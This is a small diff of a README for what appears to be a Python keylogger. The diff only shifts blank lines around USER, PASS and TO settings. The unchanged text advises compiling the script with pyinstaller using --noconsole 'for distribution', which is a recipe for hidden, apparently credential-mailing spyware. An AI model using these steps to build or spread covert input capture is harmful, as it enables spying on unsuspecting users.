@@ -7,9 +7,9 @@ You'll need the 'pyHook' and 'pythoncom' modules for this to work.
 To use it simply change the following values of the following variables
 
 USER
-
 PASS
-
 TO
+
+
 
 To your specifications and compile the script to exe with pyinstaller for distribution, use the --noconsole flag when compiling!
